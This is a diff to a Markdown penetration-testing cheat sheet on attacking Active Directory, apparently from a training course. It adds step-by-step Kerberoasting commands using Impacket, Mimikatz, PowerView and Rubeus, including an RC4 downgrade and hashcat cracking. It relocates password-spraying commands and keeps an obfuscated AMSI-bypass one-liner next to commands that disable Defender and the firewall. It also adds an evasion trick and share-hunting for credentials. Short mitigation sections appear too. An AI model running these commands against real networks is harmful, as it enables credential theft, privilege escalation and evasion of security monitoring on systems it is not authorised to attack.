@@ -472,7 +472,7 @@ smbmap -H $ip
 smbmap -H $ip -r
 # --dir-only: provides only the output of all directories and did not list all files.
 
-# Chack access and permissions level for a folder with recursion
+# Check access and permissions level for a folder with recursion
 smbmap -u $username -p $password -d $domain -H $ip -R $nameofFolder --dir-only
 
 
@@ -650,9 +650,82 @@ domain\user22
 ```
 
 
+##### Kerberoasting
+
+[See about Kerberos authentication](kerberos-authentication.md).
+
+Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. 
+
+Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary.
+
+Requirements to perform a Kerberoasting attack:
+
+- an account's cleartext password (or NTLM hash),
+- a shell in the context of a domain user account or SYSTEM level access on a domain-joined host.
+
+Depending on your position in a network, this attack can be performed in multiple ways:
+
+- From a non-domain joined Linux host using valid domain user credentials.
+- From a domain-joined Linux host as root after retrieving the keytab file.
+- From a domain-joined Windows host authenticated as a domain user.
+- From a domain-joined Windows host with a shell in the context of a domain account.
+- As SYSTEM on a domain-joined Windows host.
+- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
+
+Several tools can be utilized to perform the attack:
+
+- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
+- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
+- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
+
+###### GetUserSPNs.py
+
+[More about GetUserSPNs.py](impacket-GetUserSPNs.md).
+
+**1**. Install Impacket from: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
+
+```bash
+git clone https://github.com/fortra/impacket
+cd impacket
+sudo python3 -m pip install .
+```
+
+**2.** Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.
+
+```bash
+GetUserSPNs.py -dc-ip $ip $domain/$username
+# -dc-ip: Domain controller IP.
+# Example:
+# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+**3.** Requesting all TGS Tickets:
+
+```bash
+GetUserSPNs.py -dc-ip $ip $domain/$username -request 
+# Example:
+# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+```
+
+**4.** Or request just the TGS ticket for a specific account. 
+
+```bash
+GetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs
+# -outputfile:  to write the TGS tickets to a file 
+# Example:
+# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+
+**5.** Cracking the Ticket Offline with Hashcat.
+
+```bash
+hashcat -m 13100 file_tgs /usr/share/wordlists/rockyou.txt 
+```
+
 ## Attacking AD from Windows
 
-### Enumeration: users, credentials
+### Enumeration
 
 **Tool for enumeration**: 
 
@@ -718,7 +791,7 @@ qwinsta
 
 # Display Powershell relevant Powershell version information
 echo $PSVersion
-echo ~PSVersionTable
+echo $PSVersionTable
 
 # Prints out the OS version and revision level
 [System.Environment]::OSVersion.Version	
@@ -846,6 +919,8 @@ Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'
 
 # search for all administrative users with the `DoesNotRequirePreAuth` attribute set, meaning that they can be ASREPRoasted:
 Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}
+
+
 
 # Find all administrative users with the SPN "servicePrincipalName" attribute set, meaning that they can likely be subject to a Kerberoasting attack
 Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl
@@ -1017,6 +1092,23 @@ Get-DomainSPNTicket
 ```
 
 
+##### SharpView
+
+[More about SharpView](sharpview.md).
+
+
+Download github repo from: [https://github.com/tevora-threat/SharpView/](https://github.com/tevora-threat/SharpView/).
+
+
+```powershell
+# Obtain help about a command
+\SharpView.exe Get-DomainUser -Help
+
+# Get information about a given user
+.\SharpView.exe Get-DomainUser -Identity $username
+```
+
+
 #### Credentials 
 
 ##### LLMNR/NBT-NS Poisoning with Inveigh
@@ -1168,53 +1260,9 @@ net user %username%
 ```
 
 
-### Password spraying
+#### Networks
 
-#### DomainPasswordSpray
-
-[See DomainPasswordSpray](domainpasswordspray.md)
-
-```powershell-session
-Import-Module .\DomainPasswordSpray.ps1
-
-# Authenticated in the domain:
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
-
-# Not authenticated in the domain:
-Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-```
-
-#### kerbrute
-
-```
-./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
-```
-
-#### crackmapexec
-
-```powershell
-# Spraying password with crackmapexec
-crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
-# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
-# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
-# -H: hash
-```
-
-
-#### Mitigation techniques against password spraying
-
-- Multi-factor Authentication	
-- Restricting Access
-- Reducing Impact of Successful Exploitation
-- Password Hygiene
-
-In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.
-
-
-### Enumerating networks
-
-#### Powershell
+##### Powershell
 
 [See powershell](powershell.md).
 
@@ -1301,7 +1349,7 @@ net view /domain
 ```
 
 
-### Enumerating security controls 
+#### Security controls 
 
 cmd
 
@@ -1310,7 +1358,7 @@ cmd
 sc query windefend
 ```
 
-#### Powershell
+##### Powershell
 [See powershell](powershell.md).
 
 **Policies and antivirus**
@@ -1354,7 +1402,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 netsh advfirewall set allprofiles state off
 
 # Bypass AMSI
-**S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )**
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
 # Add a registry
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
@@ -1469,7 +1517,7 @@ net view \computer /ALL
 net view /domain	
 ```
 
-#### Dsquery
+##### Dsquery
 
 [Dsquery](dsquery.md) is a helpful command-line tool that can be utilized to find Active Directory objects. 
 
@@ -1501,7 +1549,284 @@ dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.80
 ```
 
 
-### Techniques
+#### Shares
+
+##### Snaffler
+
+[See snaffler](snaffler.md).
+
+Snaffler](https://github.com/SnaffCon/Snaffler) is a tool for **pentesters** and **red teamers** to help find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment). _Broadly speaking_ - it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.
+
+
+
+```bash
+Snaffler.exe -s -d $domain -o snaffler.log -v data
+# -s:  prints results to the console 
+# -d: specifies the domain to search within
+# -o: writes results to a logfile
+# -v: verbosity level. "data" is best as it only displays results to the screen
+```
+
+
+### Password spraying
+
+#### DomainPasswordSpray
+
+[See DomainPasswordSpray](domainpasswordspray.md)
+
+```powershell-session
+Import-Module .\DomainPasswordSpray.ps1
+
+# Authenticated in the domain:
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
+
+# Not authenticated in the domain:
+Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+#### kerbrute
+
+```
+./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
+```
+
+#### crackmapexec
+
+```powershell
+# Spraying password with crackmapexec
+crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
+# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
+# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
+# -H: hash
+```
+
+
+#### Mitigation techniques against password spraying
+
+- Multi-factor Authentication	
+- Restricting Access
+- Reducing Impact of Successful Exploitation
+- Password Hygiene
+
+In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.
+
+
+### Privileges escalation 
+
+#### Kerberoasting 
+
+[See about Kerberos authentication](kerberos-authentication.md).
+
+Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.
+
+Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:
+
+- RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
+- AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`
+
+###### setspn.exe
+
+**1.** Enumerating SPNs with setspn.exe
+
+```cmd-session
+setspn.exe -Q */*
+```
+
+We will focus on `user accounts` and ignore the computer accounts returned by the tool.
+
+**2.** Using PowerShell, we can request TGS tickets for the interested account and load them into memory.
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
+# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
+# System.IdentityModel is a namespace that contains different classes for building security token services
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+#  New-Object cmdlet to create an instance of a .NET Framework object.
+# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
+# -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
+```
+
+
+**3.** If needed, we could also retrieve all tickets:
+
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+
+**4.** Extract Tickets from Memory with Mimikatz
+
+```cmd-session
+# Launch mimikatz
+mimikatz.exe
+
+# Specify base64
+base64 /out:true
+# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.
+
+# Export the tickets
+kerberos::list /export 
+```
+
+**5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
+
+```shell-session
+echo "<base64 blob>" |  tr -d \\n 
+```
+
+
+**6.** We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.
+
+```shell-session
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+**7.** Use [kirbi2john.py](kirbi2john.md):
+
+
+```shell-session
+python2.7 kirbi2john.py Filename.kirbi
+```
+
+This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.
+
+```shell-session
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
+```
+
+**8.** Cracking the Hash with Hashcat
+
+```shell-session
+hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+```
+
+If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
+
+###### PowerView
+
+Let's use PowerView to extract the TGS tickets and convert them to Hashcat format. 
+
+**1.** Enumerating SPNs with PowerView:
+
+```powershell
+# Import module
+Import-Module .\PowerView.ps1
+
+# List SPNs: Option 1
+Get-DomainUser * -spn | select samaccountname
+
+# List SPNs: Option 2
+Get-NetUser -SPN
+```
+
+**2.** Generate a TGS ticker for a specific user:
+
+```powershell
+# Option 1
+Get-DomainUser -Identity $samAccountName | Get-DomainSPNTicket -Format Hashcat
+
+# Option 2
+Get-DomainSPNTicket -SPN $samAccountName -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt
+```
+
+**3.** Or obtain all SPN TGS tickets and export them to a CSV
+
+```powershell-session
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\FileName.csv -NoTypeInformation
+```
+
+
+###### Rubeus
+
+[See more about Rubeus](rubeus.md).
+
+Gather stats:
+
+```powershell
+ \Rubeus.exe kerberoast /stats
+```
+
+Request tickets with admincount attribute set to 1:
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+# /nowrap flag: so that the hash can be more easily copied down for offline cracking using Hashcat. The ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped.
+```
+
+ Perform Kerberoasting on a user testspn:
+ 
+```powershell
+# Perform Kerberoasting on a user testspn
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack. We can check out if the user hast the `msDS-SupportedEncryptionTypes` attribute is set to `0`.  The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.
+
+```powershell
+# Check the encryption of the TGS ticket for user testspn
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+
+#serviceprincipalname       msds-supportedencryptiontypes samaccountname
+# ----------                 ----------------------------- --------------
+# testspn/kerberoast.inlanefreight.local               0   testspn
+```
+
+With RC4 (type 23) encryption, this would be the hashcat module:
+
+```shell-session
+hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
+```
+
+The results for the AES-256 (type 18) encryption would be `24`:
+
+```powershell
+# Check the encryption of the TGS ticket for user testspn
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+
+#serviceprincipalname       msds-supportedencryptiontypes samaccountname
+# ----------                 ----------------------------- --------------
+# testspn/kerberoast.inlanefreight.local               24   testspn
+```
+
+With AES (type 18) encryption, this would be the hashcat module:
+
+```shell-session
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+```
+
+**We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256.** This may be a failsafe built-in to Active Directory for backward compatibility.
+
+```powershell
+# Perform Kerberoasting on a user testspn
+.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
+# /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.
+```
+
+> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.
+
+> In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 
+
+
+##### Mitigating Kerberoasting
+
+Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.
+
+omain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy. Doing so will generate two separate event IDs:
+
+-  [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, 
+- and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed.
+
+10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.
+
+Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).
+
+
+### Evasion Techniques
 
 #### Downgrade Powershell
 
@@ -1515,3 +1840,11 @@ powershell.exe -version 2
 
 PowerShell Operational Logs are kept under under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`.
 Also the `Windows PowerShell` log is located at `Applications and Services Logs > Windows PowerShell`.
+
+#### Net Commands Trick
+
+Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string. Example:
+
+```powershell
+net1 user /domain	
+```
